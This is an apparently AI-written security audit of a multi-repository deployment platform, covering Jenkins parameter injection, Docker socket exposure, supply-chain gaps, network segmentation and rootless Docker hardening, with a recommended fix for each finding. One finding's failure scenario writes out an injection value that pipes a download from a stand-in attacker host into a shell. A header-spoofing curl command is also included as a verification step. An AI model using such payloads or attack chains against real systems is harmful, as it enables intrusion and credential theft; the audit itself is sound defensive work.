# hAIsir Security Review — 2026-08-19 (full re-scan)

**Reviewer:** Claude Opus 5 (Claude Code), single-pass full-surface audit
**Basis:** end state at `haisir-deploy 3064480`, `haisir-backend 46570b7`, `haisir-frontend 6512e83` — all three working trees clean
**Scope:** all three code repos plus every environment surface (dev / staging / prod / CI) and every
`other/services/*` stack: Jenkins, SonarQube, private registry, NPM, Cloudflare Tunnel, CrowdSec,
dockhand, embedding VM, Tailscale ACL.

## Method and constraints

This pass had two jobs: **re-verify** every finding left open by the five prior reviews in
`security/`, and **scan for new issues** — including the surfaces those reviews explicitly recorded
as *not covered*. Every status below was checked against source at the HEADs above, not carried
forward from a planning doc.

Prior artifacts read first, then set aside: `SECURITY_REVIEW_2026-07-02.md`,
`PHASE7_SECURITY_REVIEW_PASS1.md`, `PASS2.md`, `PHASE7_REVIEW_RESOLUTIONS.md`,
`SECURITY_REVIEW_2026-08-18_PHASE7.5_pass-a-diff.md`, `..._pass-b-endstate.md`.

**Secret handling, as instructed.** Read: `{dev,staging,prod}/.env`, `{dev,staging,prod}/.env.config.sh`,
`common/.env.config.common.sh` — and every value in this report from those files is redacted or
described by key name only. Not read: any `.env` under `other/services/`, any `.env_info`, any
OpenBao KV path. Where a conclusion would have needed one of those, it is marked **PLAUSIBLE** with
the exact command an operator can run to close it. No live environment was logged into.

**What this pass did not do.** No live-host verification (no SSH, no `docker inspect` against a
running stack), so on-host file modes, the applied Tailscale ACL, the Cloudflare tunnel's ingress
rules, and NPM's runtime proxy-host config are all judged from the repo copy — which is intent, not
proof. Six items below are flagged for exactly that reason.

---

## TL;DR

The 2026-07-02 baseline is genuinely closed out. Every High and Medium in it is either fixed or
carries a written accepted-risk record, and I re-confirmed the load-bearing ones directly: audience
validation is on, the Keycloak realm has a password policy and `sslRequired: external`, the
streaming body cap is real, CRS is at 4.25.1 LTS on Coraza 3.7.0 (CVE-2026-21876 closed), the WAF
exclusions were converted from whole-request `ctl:ruleRemoveById` to field-scoped
`ctl:ruleRemoveTargetById`, the prompt-injection hole is closed by a `Literal["student","ai"]`, the
image proxy has a strict filename regex, `OAUTH__KEYCLOAK__SSL_VERIFY` is gone from prod and
staging, and the vault-agent secret volumes really are `tmpfs`. B23 (service-name injection into
`remote_exec`) is fixed *and* has a CI regression test. That is a strong record.

**The problem is that the hardening is unevenly distributed.** Every finding below is in a place
no prior pass looked. The two HIGHs are the *same* Jenkins parameter-injection class that M3 closed
in `haisir-deploy/Jenkinsfile.deploy` and `haisir-backend/Jenkinsfile` on 2026-08-04 — but the fix
was never applied to `haisir-frontend/Jenkinsfile` or `Jenkinsfile.integration-dast`. Both prior
Phase 7.5 passes named `Jenkinsfile.integration-dast` in their "not covered" list; the frontend
Jenkinsfile was never in any pass's scope at all.

That matters more than it would elsewhere, because of what the Jenkins agent holds. It mounts the
host's rootless Docker socket **read-write** (pass-B F2, still open), and its credential store holds
`prod-ssh-key`. `tag:ci` has SSH to `tag:prod`. So shell execution on the Jenkins agent is a direct
path to production, and there are now three unvalidated free-text build parameters that reach a
shell there.

Severity legend: **High** = fix before the next release; **Medium** = expected at this platform's
stated posture; **Low** = hygiene / defense-in-depth. **PLAUSIBLE** = mechanism confirmed in the
repo, live behaviour not verified.

---

## Part 1 — Status of previously-open findings

Re-verified against source today. Rows marked ✅ moved since 2026-08-18.

| # | Finding | Status today |
|---|---|---|
| B-F1 | Service names → `remote_exec` command injection | ✅ **FIXED.** `deploy.sh:210-215` validates every name against `^[a-z][a-z0-9_-]*$` at the single choke point both sources funnel through; `Jenkinsfile.deploy:90-93` rejects the `SERVICES` param too; `tests/service-name-validation-check.sh` is wired into CI. |
| A-F1 / B-F3 | `-t 0` prod confirmation fail-open | ✅ **FIXED** (recorded 2026-08-18). |
| A-F2 | `bootstrap-host.sh` false success | ✅ **FIXED** (recorded 2026-08-18). |
| A-F6 | `alertmanager.yml` 600 vs container uid | ✅ **FIXED.** `alertmanager-init` (`common/docker-compose.yml:761-783`) copies into a named volume, `chown 1000:1000`, `chmod 600`. |
| B-F5 | OpenBao README contradiction | ✅ **RESOLVED** (README corrected 2026-08-18). |
| **B-F2** | **Jenkins mounts rootless docker.sock read-write** | **STILL OPEN.** `other/services/jenkins/docker-compose.yml:24` — no `:ro`, plus `group_add: ["0"]`. See N1/N2 for why this is now load-bearing. |
| **B-F4** | **cftunnel token in `command:` and `environment:`** | **STILL OPEN.** `other/services/cftunnel/docker-compose.yml:6,14` unchanged. |
| **B-F6** | **OpenBao root-token revocation is a log warning only** | **STILL OPEN.** `common/openbao/bootstrap.sh:246` is still the entire enforcement. |
| **B-F7** | **`docker.sock:ro` is not a restriction; dockhand auth is opt-in** | **STILL OPEN.** Both mounts unchanged. See also N12. |
| **B-F8** | 27 pre-migration secrets in git history | **ACCEPTED RISK**, deferred by owner 2026-08-18. Unchanged. |
| **B-F9** | `rotate-secret.sh` new value in argv | **STILL OPEN.** `common/openbao/rotate-secret.sh:23` — `NEW_VALUE="${3:-}"`. |
| **B-F10** | Frontend container has no explicit non-root `USER` | **STILL OPEN.** `haisir-frontend/Dockerfile` — runtime stage starts at `:61`, file ends at `ENTRYPOINT`, no `USER`. No compose-level `user:` either. |
| **B-F11** | Stale "APISIX requires root" comment | **STILL OPEN.** `common/docker-compose.yml:658`. |
| **B-F12** | Keycloak policy path-wide grant | Accepted, architecturally forced. No action. |
| **A-F3** | Exporter variable provenance | **STILL OPEN**, gate before the `monitoring` profile ships. |
| **A-F4** | `create_route_config.sh` treats HTTP 401/403 as "nothing to preserve" | **STILL OPEN.** `create_route_config.sh:225-235` — still `if live_raw=$(curl -s ...)`. `curl -s` without `--fail` exits 0 on 401, so the warning branch is unreachable and the deploy silently revokes a live grant. The one-line `-w '%{http_code}'` fix from pass A still applies. |
| **A-F5** | `keycloak-admin-access.sh grant` with no arg resolves the *host's* egress IP | **STILL OPEN.** `:137` still calls `api.ipify.org`. |
| **A-F7** | APISIX Prometheus export on `0.0.0.0` | **STILL OPEN**, informational — accept explicitly or segment. |
| **A-F8** | `chmod 666` on rendered `config.yaml` in the shared volume | **STILL OPEN.** `deploy.sh:909`, and `env-setup.sh:305,312` is worse (`chmod 777 /conf` + `find /conf -type f -exec chmod 666`). |
| **A-F9** | `skip()` increments `PASSED` | **STILL OPEN.** `tests/config.sh:266`. A test that cannot fail is counted as coverage. |
| **A-F10** | BR-SEC-022 names `--chmod=D700,F600`; code chmods after | **STILL OPEN.** `deploy-lib.sh:151-152` — post-sync `chmod 600`, with the 644 window intact. |

Nothing regressed. Nine items are still open, all pre-existing.

---

## Part 2 — New findings

### N1 — HIGH · command injection · `haisir-frontend/Jenkinsfile` interpolates two unvalidated build parameters into `sh` blocks

**Repo:** haisir-frontend · `Jenkinsfile:4-7, 268-288, 364-370`

The pipeline declares two free-text string parameters and validates neither:

```groovy
string(name: 'NEXT_PUBLIC_BACKEND_URL', defaultValue: 'https://staging.haisir.in', ...)
string(name: 'TAG', defaultValue: 'v2026.7-staging', ...)
```

`grep -n '==~' Jenkinsfile` returns nothing. Both are then Groovy-interpolated into
triple-**double**-quoted `sh` blocks — meaning Groovy substitutes the value into the script text
*before* bash ever parses it:

```groovy
sh """
    docker build \
        --build-arg TAG=${params.TAG} \
        --build-arg NEXT_PUBLIC_BACKEND_URL=${params.NEXT_PUBLIC_BACKEND_URL} \
        -t ${env.DOCKER_IMAGE}:${params.TAG} \
        .
"""
```

and again at `:287` (`docker save`) and `:368-369` (`docker tag` / `docker push`, inside the
`withCredentials` block that holds the registry password).

**Failure scenario.** `TAG` = `x"; curl http://attacker/x | sh; echo "` closes the shell string and
runs arbitrary commands as the Jenkins user. That user's process has
`/run/user/1000/docker.sock` mounted read-write (B-F2), so the payload gets full control of every
container and volume on the CI host — including reading `jenkins_home`, which holds the
`prod-ssh-key` credential. `tag:ci` has SSH to `tag:prod` in the Tailscale ACL. This is a path from
"can trigger a parameterized frontend build" to "shell on production."

`NEXT_PUBLIC_BACKEND_URL` is a second, quieter problem even without breakout: it is baked into the
client bundle at build time, so a benign-looking value pointed at an attacker origin redirects the
shipped frontend's API calls. (`connect-src 'self'` in the CSP would block it at runtime — that is
the CSP earning its keep, not a reason to leave the parameter unvalidated.)

**Why this was missed.** M3 was closed on 2026-08-04 as "CONFIRMED FIXED — both halves, re-verified
in both repos." The two halves were `haisir-deploy/Jenkinsfile.deploy` and
`haisir-backend/Jenkinsfile`. There is a third Jenkinsfile with build parameters, in a repo neither
half named.

**Fix.** Copy the discipline the backend Jenkinsfile already uses verbatim — validate in the first
stage, then pass through `withEnv` + single-quoted `sh`, never Groovy interpolation:

```groovy
if (!(params.TAG ==~ /^[A-Za-z0-9._-]+$/)) { error "Invalid TAG '${params.TAG}'" }
if (!(params.NEXT_PUBLIC_BACKEND_URL ==~ /^https:\/\/[A-Za-z0-9.-]+$/)) { error "Invalid backend URL" }
...
withEnv(["TAG=${params.TAG}", "BACKEND_URL=${params.NEXT_PUBLIC_BACKEND_URL}"]) {
    sh 'docker build --build-arg TAG="$TAG" --build-arg NEXT_PUBLIC_BACKEND_URL="$BACKEND_URL" -t "$DOCKER_IMAGE:$TAG" .'
}
```

---

### N2 — HIGH · command injection · `Jenkinsfile.integration-dast`'s `STAGING_URL` parameter reaches eleven shell interpolations unvalidated

**Repo:** haisir-deploy · `Jenkinsfile.integration-dast:29-33`, used at `:77, 85, 113, 120, 129, 161, 177, 208, 223, 253`

```groovy
string(name: 'STAGING_URL', defaultValue: 'https://staging.haisir.in', ...)
```

No regex gate. It is then interpolated into `sh """..."""` in every stage — the health check's
`curl` URL, the integration-test loop's `GATEWAY_URL=` assignment, both ZAP `-t` targets, and the
Schemathesis schema URL. Same mechanism as N1, same blast radius (this job runs on the same agent
with the same socket and the same credential store — and this one additionally loads
`staging-keycloak-client-secret` and `staging-test-user-password` into the environment via
`withCredentials` at `:107-110`, so an injected command can simply `echo` them).

This job also runs on a nightly `cron('H 2 * * *')` trigger, so a poisoned default or a stored
parameter value executes unattended.

**Both Phase 7.5 passes explicitly listed this file as out of scope** — pass B's coverage statement
says "`Jenkinsfile.integration-dast` — not read this pass; if it accepts free-text build parameters
the way `Jenkinsfile.deploy`'s `SERVICES` does, the same class of finding as F1 may recur there."
It does.

**Fix.** Same shape as N1. A URL allowlist is better than a regex here, since there are only two
legitimate values and one of them must never be used:

```groovy
if (!(params.STAGING_URL in ['https://staging.haisir.in'])) {
    error("STAGING_URL must be the staging endpoint, got: '${params.STAGING_URL}'")
}
```

That also enforces the warning the parameter's own description already carries ("Do NOT use the prod
URL — active scan sends real attack payloads"), which is currently honour-system only. Then move the
value into `withEnv` and single-quote the `sh` bodies.

---

### N3 — MEDIUM · privilege boundary · `node-exporter` bind-mounts the host root filesystem and shares the host PID namespace

**Repo:** haisir-deploy · `common/docker-compose.yml:825-853`

```yaml
node-exporter:
  pid: host
  volumes:
    - /proc:/host/proc:ro
    - /sys:/host/sys:ro
    - /:/rootfs:ro
  networks: [haisir-net]
```

Under **rootless** Docker this is materially worse than it looks. The container's uid range maps
into the deploy user's subuids, and the deploy user is the owner of everything the secrets model
protects with mode 600. So a read-only mount of `/` inside a container that can reach that uid
exposes, in one hop:

- `~/haisir-deploy/{env}/.env` and `.env.config.sh` (the 600 files `deploy-lib.sh:147` tightens),
- `common/openbao/.bootstrap-out/<env>/server-init.json` — **the OpenBao root token**, which B-F6
  establishes is never actually revoked,
- `~/.ssh/`, and the rendered `/secrets/*` tmpfs contents via `/rootfs/var/lib/docker/...`.

`pid: host` compounds it: the container can read `/proc/<pid>/cmdline` and `/proc/<pid>/environ`
for every process the deploy user runs — which is exactly where B-F4 puts the Cloudflare tunnel
token and B-F9 puts the rotated secret value. Two accepted-as-minor argv exposures become readable
by a metrics exporter on the flat `haisir-net`.

Neither mount is load-bearing for what this exporter is configured to collect. `pid: host` is only
needed by `--collector.processes`, which is not enabled. `/:/rootfs:ro` feeds
`--path.rootfs=/rootfs` for the filesystem collector, whose mount-point list is already restricted
by `--collector.filesystem.mount-points-exclude`.

The `monitoring` profile has **never been started on staging or prod** (A-F3, A-F6 both note this),
so this is a defect to fix before first deploy, not an active exposure. That is the cheapest moment
it will ever be.

**Fix.** Drop `pid: host`. Replace `/:/rootfs:ro` with the specific paths the filesystem collector
needs, or disable that collector and keep `/proc` + `/sys` only:

```yaml
  # pid: host removed — --collector.processes is not enabled and nothing else needs it
  volumes:
    - /proc:/host/proc:ro
    - /sys:/host/sys:ro
  command:
    - --path.procfs=/host/proc
    - --path.sysfs=/host/sys
    - --no-collector.filesystem
```

Then add `pid:\s*host` and a bare `- /:` bind to `dev-isolation-check.sh` so it cannot come back.

---

### N4 — MEDIUM · supply chain · the CI image installs six tools over the network with no integrity verification

**Repo:** haisir-deploy · `other/services/jenkins/Dockerfile:55-151`

`yq` is pinned by version **and** SHA256, with the checksum verified before use (`:150-158`). Nothing
else is:

| Tool | Line | Verification |
|---|---|---|
| Trivy | `:55-59` | version-pinned tarball, **no checksum** |
| Gitleaks | `:64-68` | version-pinned tarball, **no checksum** |
| Hadolint | `:109-112` | version-pinned binary, **no checksum** |
| SonarScanner CLI | `:136-140` | version-pinned zip, **no checksum** |
| `uv` | `:93` | **`wget -qO- https://astral.sh/uv/install.sh \| … sh`** — unpinned, unverified, piped to a shell |
| semgrep / schemathesis / pip-audit / yamllint / checkov | `:75, 82, 88, 116, 122` | `pip install` with **no version pin and no hashes** |
| Jenkins plugins | `:151` | `jenkins-plugin-cli --plugins ssh-agent matrix-auth` — **no versions** |

Two more in the same class outside this file:

- `haisir-frontend/Jenkinsfile:39` — `curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/…/install.sh | bash`, then `nvm install --lts` (unpinned Node).
- `haisir-backend/Jenkinsfile:101,119` — `docker pull pgvector/pgvector:pg18`, a Docker Hub image by mutable tag, in a repo whose BR-INFRA-001/002 mandate Minimus + no mutable tags.

This is the one place in the whole platform where supply-chain discipline is absent, and it is the
highest-value target: the resulting image holds the prod SSH key and the RW docker socket. The
frontend and backend repos apply `--ignore-scripts`, pnpm `minimumReleaseAge`, `--frozen-lockfile`
and `uv sync --frozen`; none of that protects the pipeline that runs them.

**Fix, cheapest first.** Add `sha256sum -c` to the four release downloads — the `yq` block is
already the template, four copies of three lines. Replace the `uv` installer pipe with the pinned
release tarball plus a checksum. Pin every `pip install` to `==<version>`, and every Jenkins plugin
to `<name>:<version>`. For `pgvector`, either move to `reg.mini.dev/pgvector:pg18` or add a digest.

---

### N5 — MEDIUM · destructive operation · `docker system prune -a -f --volumes` runs on the shared CI daemon after every backend build

**Repo:** haisir-backend · `Jenkinsfile:341-345`

```groovy
withEnv(["TAG=${params.TAG}"]) {
    sh '''
        docker builder prune -a -f || true
        docker rmi "$DOCKER_IMAGE:$TAG" 2>/dev/null || true
        docker system prune -a -f --volumes || true
    '''
}
```

`--volumes` on `system prune` deletes every volume not currently attached to a running container,
across the **whole daemon** — not just this build's. That daemon also runs the private registry
(`registry-data`), SonarQube (`sonarqube-data`, `sonarqube-db-data`, `sonarqube-extensions`) and
Jenkins itself (`jenkins_home`). While those containers are up, their volumes are in use and
survive. The moment any of them is stopped — an upgrade, a restart, `sysctl` tuning for SonarQube,
a host reboot where one service fails to come back — a backend build fires this and takes the data
with it. `registry-data` holding every deployable image, and `sonarqube-db-data` holding the entire
quality-gate history, are the two that do not come back.

The `|| true` guarantees it fails silently.

The other two pipelines get this right: `haisir-frontend/Jenkinsfile:391` and
`gateway-docker/Jenkinsfile:227` both use `docker image prune -f --filter 'until=24h'`. The backend
is the outlier.

**Fix.** Match the other two — `docker image prune -f --filter 'until=24h'`. If build-cache growth is
the real problem, `docker builder prune -a -f` (already on the line above) is the tool for it.
Nothing in a build should ever run `system prune --volumes` on a daemon it shares.

---

### N6 — MEDIUM · false assurance · four static security checks exist in `common/scripts/tests/` and are wired into no pipeline

**Repo:** haisir-deploy · `Jenkinsfile:118-149`

The CI stage carries this comment, which is exactly right:

> Anything under `tests/` named `*-check.sh` / `*-scan.sh` / `audit-*.sh` is static and has to be
> wired explicitly, or it never runs in CI at all (which is how the four below sat unexecuted until
> 2026-08-13).

Four more are in the same state today. I grepped every `Jenkinsfile*`, every `.sh`, and every `.md`
for each name; the only hits are prose in `common/openbao/*.md`:

| Script | Runs offline? | Wired anywhere? |
|---|---|---|
| `certbot-hook-assertion-check.sh` | **Yes** — its own header says "No live host, no OpenBao" | **No** |
| `docker-inspect-exposure-check.sh` | Needs a live stack | **No** |
| `backend-admin-no-drift-check.sh` | — | **No** |
| `templated-config-hash-verify.sh` | — | **No** |

`docker-inspect-exposure-check.sh` is the one that stings: it asserts no Class B password value is
reachable via `docker inspect Config.Env`. That is precisely the guard that would have caught
**B-F4** (the Cloudflare tunnel token delivered through `environment:`), and it has never run. It
would not catch it as written — its container list covers `db`/`keycloak-db`/`keycloak` only — but
a check that exists, would be extended in five minutes, and is invoked by nothing is worse than no
check, because the phase record cites it as coverage.

`test-runner.sh` discovers `*-test-*.sh`, so none of these four can be picked up by it either.

**Fix.** Add `certbot-hook-assertion-check.sh` to the *Static Security Checks* stage (it is offline;
it belongs there). Add the three live-stack checks to `bootstrap-host.sh`'s `run_tests` or to the
post-deploy path in `Jenkinsfile.deploy`, and extend `docker-inspect-exposure-check.sh`'s container
list to include `cloudflared-tunnel`. Then add a meta-check: fail CI if any
`tests/*-check.sh` / `*-scan.sh` / `audit-*.sh` file is not referenced by a Jenkinsfile — this is the
third time this exact gap has been found, so the durable fix is the one that finds the fourth.

---

### N7 — MEDIUM · network segmentation · the Cloudflare Tunnel connector shares `haisir-net` with the database, OpenBao and etcd, and its ingress rules live only in the Cloudflare dashboard

**Repo:** haisir-deploy · `other/services/cftunnel/docker-compose.yml:9-11`, `other/services/cftunnel/README.md`

```yaml
networks:
  - cloudflare-tunnel-net
  - haisir-net
```

`cloudflared` is the platform's entire public ingress. `haisir-net` is a single flat bridge carrying
`db`, `keycloak`, `keycloak-db`, `etcd`, `apisix` (including its admin port `9180`), all six
`vault-agent-*` sidecars, `openbao` itself, `crowdsec`, and every exporter.

Two consequences:

1. **The README's own security claims are false for the deployed config.** It says "cf-network …
   Isolated network for cloudflared container / No other services attached" and "Controlled access
   to APISIX only". The compose file joins `haisir-net` directly, and the README's own deploy step
   tells you to `docker network connect {app-network}` as well.

2. **The ingress map is unversioned and unreviewable.** This is a token-based tunnel
   (`--token ${TUNNEL_TOKEN}`), which means public-hostname → origin mapping is stored in
   Cloudflare's Zero Trust dashboard, not in this repo. There is no local `config.yml` bounding what
   the connector may reach. So the set of things exposed to the internet is defined entirely by
   dashboard state that no one in this repo can review, diff, or gate — and the connector can reach
   `db:5432`, `openbao:8200` and `apisix:9180` on the flat network. A dashboard misconfiguration or
   a compromised Cloudflare account publishes any of them straight to the internet, **bypassing
   APISIX, Coraza and CrowdSec entirely**, since those only sit on the `9443` path.

Every other control in this stack is codified and CI-gated. This one is a checkbox in someone else's
web UI, sitting in front of everything.

**Fix.** Give the tunnel its own bridge shared with **APISIX alone** — a second user-defined network
that only `apisix` and `cloudflared` join — and drop `haisir-net` from the cftunnel service. Then
migrate from a token-run tunnel to a locally-mounted `config.yml` with an explicit `ingress:` block
ending in `- service: http_status:404`, so the ingress map is committed, reviewable and diffable.
Correct the README's network claims either way.

---

### N8 — MEDIUM · PLAUSIBLE · access-control bypass · NPM trusts `X-Real-IP` from the entire Tailscale CGNAT range, which the staging Keycloak-admin IP allowlist sits behind

**Repos:** haisir-deploy · `other/services/npm/nginx-custom.conf:8`, `staging/.env.config.sh:12,21`,
`common/routes/{13-keycloak-admin,14-keycloak-master-realm,15-keycloak-admin-resources}.json`

The chain, config-by-config:

1. `nginx-custom.conf` (mounted at `/data/nginx/custom/http_top.conf`, i.e. http-wide) sets
   `set_real_ip_from 100.64.0.0/10` — the whole Tailscale CGNAT allocation. It sets no
   `real_ip_header`, and **nginx's default for that directive is `X-Real-IP`**. So NPM rewrites
   `$remote_addr` from a client-supplied `X-Real-IP` header for any peer inside 100.64.0.0/10 —
   which is every device on the tailnet.
2. NPM's proxy-host template forwards `proxy_set_header X-Real-IP $remote_addr` — now the spoofed
   value.
3. Staging sets `REAL_IP_SOURCE="http_x_real_ip"` and `NPM_NETWORK_SUBNET="172.20.0.0/16"`, and the
   three Keycloak-admin route configs list that subnet in the `real-ip` plugin's
   `trusted_addresses`. APISIX therefore accepts NPM's forwarded value as the client IP.
4. `ip-restriction` on those same routes evaluates its `{{KEYCLOAK_ADMIN_ALLOWED_CIDR}}` whitelist
   against that rewritten address.

Net effect: on staging, the `/32` allowlist protecting the Keycloak admin console — the control
`keycloak-admin-access.sh` exists to manage, with a `MIN_GRANT_PREFIX=24` bound and a "THIS GRANT
DOES NOT EXPIRE" banner — is satisfiable by any tailnet node sending `X-Real-IP: <allowed-ip>`. The
same header-spoofing also defeats rate limiting and CrowdSec keying on those routes.

The tailnet ACL grants `tag:staging:443` to `tag:dev1`, `tag:in-dev1`, `tag:in-dev2` and `tag:ci`, so
the reachable set is small — but the whole point of layering an IP allowlist behind tailnet
membership is to be a second factor, and this collapses it to the first.

Prod is **not** affected the same way: `REAL_IP_SOURCE="http_cf_connecting_ip"`, Cloudflare strips
client-supplied `CF-Connecting-IP` at the edge, and the only trusted peer is `cloudflared`. (Prod
retains the weaker residual that any container on `haisir-net` — including `cloudflared` per N7 —
sits inside `DOCKER_NETWORK_SUBNET` and can therefore set the header directly against APISIX. That
needs an already-compromised container, so it is defense-in-depth, not a live hole.)

**Marked PLAUSIBLE** because I verified the mechanism from the committed configs but did not confirm
that this NPM version loads `http_top.conf` into the `http` context, nor that the staging proxy host
forwards `X-Real-IP`. Close it with, from a tailnet device that is *not* in the whitelist:

```
curl -sS -o /dev/null -w '%{http_code}\n' -H 'X-Real-IP: <an-allowed-ip>' https://<staging-host>/admin/master/console/
```

403 means the chain does not hold. 200/302 means it does.

**Fix.** Narrow `set_real_ip_from` to the specific upstream addresses that legitimately front NPM —
not the entire CGNAT range — and set `real_ip_header` explicitly rather than inheriting the default.
On the routes themselves, note that an IP allowlist evaluated after a header rewrite is only ever as
strong as the narrowest trusted-peer set in the chain.

---

### N9 — LOW · the backend still defaults `X-XSS-Protection: 1; mode=block`

**Repo:** haisir-backend · `src/shared/config.py:153`

```python
x_xss_protection: str = Field(default="1; mode=block")
```

L3 in the 2026-07-02 review named *both* repos — "haisir-backend `security_middleware.py` / config,
haisir-deploy `response-rewrite`" — and was closed on 2026-08-04 on the strength of all four APISIX
plugin configs setting `"0"`. The backend half was never changed, and
`security_middleware.py:51-53` still emits the value on every response it originates.

In practice APISIX's `response-rewrite` overwrites it on the routes that carry the header set, so
what reaches a browser today is `0`. But the header-ownership table in
`target/requirements/15_security_headers.md` and the code now disagree, and the deprecated value
returns on any route that loses its rewrite — precisely the failure the two-tier scoping in T7.4.2
was designed around.

**Fix.** One character: `Field(default="0")`. Consider dropping the header entirely — CSP replaced it.

---

### N10 — LOW · NPM's own security headers repeat the deprecated `X-XSS-Protection`, and its `set_real_ip_from` is dead config as written

**Repo:** haisir-deploy · `other/services/npm/nginx-custom.conf`

```nginx
add_header X-XSS-Protection "1; mode=block" always;
...
set_real_ip_from 100.64.0.0/10;
```

Same deprecated value as N9, in the reverse proxy that fronts the Jenkins, SonarQube and registry
admin UIs. Separately, `set_real_ip_from` without a `real_ip_module` binding is a no-op for anything
other than the default `X-Real-IP` — which is the substance of N8, so fixing that fixes this line
too. Two further notes: there is no `X-Frame-Options`/CSP on the *admin* UIs beyond what is here, and
nginx `add_header` in an outer block is **replaced**, not merged, by any `add_header` in a matching
`location` — so these four headers silently vanish on any proxy host that sets its own.

**Fix.** `X-XSS-Protection "0"`, and verify with `curl -I` against one proxied admin host that the
headers actually survive to the response.

---

### N11 — LOW · dev compose publishes the APISIX Admin API, its dashboard, pgAdmin and Postgres on `0.0.0.0`

**Repo:** haisir-deploy · `dev/docker-compose.yml:16-17, 40-41, 68-69, 118-120`

```yaml
- "5432:5432"     # postgres
- "5050:80"       # pgAdmin, with PGADMIN_CONFIG_MASTER_PASSWORD_REQUIRED=False
- "8180:8080"     # keycloak, start-dev
- "9080:9080"
- "9180:9180"     # Admin API + embedded dashboard UI, enable_admin_ui: true
```

None carry a `127.0.0.1:` prefix, unlike `9091` two lines below which does. Combined with dev's
`allow_admin` covering the whole docker subnet and `KEYCLOAK_ADMIN_ALLOWED_CIDR="0.0.0.0/0"`, anyone
on the developer machine's LAN gets the APISIX admin dashboard and an unauthenticated pgAdmin.

The tailnet is not the exposure here — no ACL rule names `tag:dev1` as a destination, so tailnet
peers cannot reach it. The dev machine's Wi-Fi/LAN is. `dev-isolation-check.sh:76` already asserts
these ports never appear *outside* `dev/`; it does not care what interface they bind to inside it.

**Fix.** Prefix all five with `127.0.0.1:`. Costs nothing — everything that consumes them is
local — and removes a whole class of "I was on café Wi-Fi" incident.

---

### N12 — LOW · `other/security-audit.sh` encodes the `docker.sock:ro` misconception as a LOW finding

**Repo:** haisir-deploy · `other/security-audit.sh:838-840`

```bash
finding HIGH "DOCKER-02" "Docker socket mounted read-WRITE in container — privilege escalation path"
finding LOW  "DOCKER-03" "Docker socket mounted read-only in container (dockhand pattern) — review intent"
```

`DOCKER-02` is right, and would flag Jenkins (B-F2) on any CI-host run — good. `DOCKER-03` is the
problem: `:ro` restricts filesystem operations on the socket *file*, not what the Docker Engine API
accepts over it. A `:ro`-mounted socket still grants create/exec/bind-mount on any container, which
is root-equivalent on the host's containers. Rating it LOW as "the dockhand pattern" turns a real
privilege boundary into a reassuring line item — the same misconception dockhand's README carries
("Read-only Docker socket — Reduces attack surface"), now baked into the tool the team uses to check
itself.

**Fix.** Raise `DOCKER-03` to HIGH with text naming what `:ro` does and does not do, and correct
`other/services/dockhand/README.md`. This one is worth doing precisely because it is what the team
will read next time.

---

### N13 — INFO · `validate_csrf`'s docstring describes a Bearer-token exemption the code does not implement

**Repo:** haisir-backend · `src/auth/csrf.py:43`

> "Validate CSRF token for incoming requests **except those with Bearer tokens**."

The body (`:58-66`) has no such branch — it checks `settings.csrf.enabled` and validates. Good, and
important: APISIX injects a Bearer token on *every* request, so a Bearer exemption would void CSRF
protection platform-wide. Not a vulnerability. Flagged because the docstring reads as a
specification, and a future editor "restoring" the documented behaviour would silently disable CSRF
everywhere.

**Fix.** Delete the clause.

---

## Part 3 — Rootless Docker hardening

The rootless choice is already doing real work: a container escape lands as an unprivileged host
user, and the M5 accepted-risk record for Postgres TLS is explicitly load-bearing on it. What
follows is what is left, ordered by value.

**One structural note first.** There is no codified host baseline anywhere in this repo.
`bootstrap-host.sh` does certs → `full-setup` → verify → tests; it provisions no host state.
`other/create_vm.sh` is a libvirt helper. `other/security-audit.sh` *detects* drift but establishes
nothing. So every item below is currently an undocumented manual step on each host — which is why
several of them are marked "verify": I cannot tell from the repo whether they were done.

### 3.1 — AppArmor does not apply to these containers, and nothing records that

This is the single largest security *regression* from choosing rootless, and it is written down
nowhere. Rootful Docker applies the `docker-default` AppArmor profile to every container. Rootless
Docker **cannot** — loading an AppArmor profile requires real root, so containers run
AppArmor-unconfined. On Ubuntu 24.04 the only profile in play confines `rootlesskit` itself, not the
workloads.

Seccomp is unaffected — rootless Docker still applies the default seccomp profile, and nothing in
this repo sets `seccomp:unconfined` (I checked). So the stack has seccomp ✓ / AppArmor ✗, where a
rootful equivalent would have both.

`security-audit.sh:901` reports `AA-01 "AppArmor not available"` at MEDIUM based on whether AppArmor
exists on the host — which will read as PASS on Ubuntu 24.04 while zero containers are confined.
That is a check that measures the wrong thing.

**Options, in order of effort:**
1. Record it explicitly as an accepted consequence of rootless, in
   `target/requirements/14_container_images.md`. Zero work, and it stops the next reviewer
   re-deriving it.
2. Load a profile once at host bootstrap as root (`apparmor_parser -r /etc/apparmor.d/haisir-container`)
   and reference it per-service with `security_opt: ["apparmor=haisir-container"]`. Rootless Docker
   can *reference* an already-loaded profile even though it cannot load one. Start with the
   internet-facing three (`apisix`, `frontend`, `cloudflared`).
3. Fix `AA-01` to check `docker inspect --format '{{.AppArmorProfile}}'` on running containers rather
   than host capability.

### 3.2 — Verify cgroup delegation, or every resource limit in the compose files is silently a no-op

`common/docker-compose.yml` sets `mem_limit`, `cpus`, `pids_limit` and `ulimits` on essentially every
service. Under rootless Docker those are enforced **only** if cgroup v2 delegation is enabled for the
user's systemd slice. Without it, Docker warns once at container start and runs unlimited — and
nothing in this repo checks.

```bash
# verify (on each host, as the deploy user)
cat /etc/systemd/system/user@.service.d/delegate.conf
# expect: [Service] / Delegate=cpu cpuset io memory pids
docker info 2>&1 | grep -iE 'cgroup|WARNING'
docker inspect <container> --format '{{.HostConfig.Memory}} {{.HostConfig.PidsLimit}}'   # non-zero = enforced
```

If the last command returns `0 0` for a service whose compose block sets limits, none of the limits
in this repo have ever applied. Worth adding as a `security-audit.sh` check — it is two lines and it
validates ~40 config directives at once.

### 3.3 — Verify the rootful daemon is masked and lingering is enabled

Rootless installs commonly leave the system daemon installed but stopped. If `docker.service` can be
started, a second, **root**, daemon exists on the same host with its own socket — every containment
property assumed by the M5 accepted-risk record evaporates for anything launched through it.

```bash
systemctl is-enabled docker.service docker.socket   # want: masked (or disabled)
loginctl show-user "$USER" --property=Linger        # want: Linger=yes, or containers die on logout
systemctl --user is-enabled docker.service          # want: enabled
```

### 3.4 — `read_only: true` is missing on nine services that could take it

Present on `db`, `backend`, `worker`, `frontend`, `keycloak-db`, `etcd`, and (outside the main stack)
`crowdsec`, `registry`, `sonarqube-db`, `cloudflared`. Missing on:

`apisix`, `keycloak`, `prometheus`, `alertmanager`, `grafana`, `node-exporter`, `postgres-exporter`,
`nginx-prometheus-exporter`, and all six `vault-agent-*`.

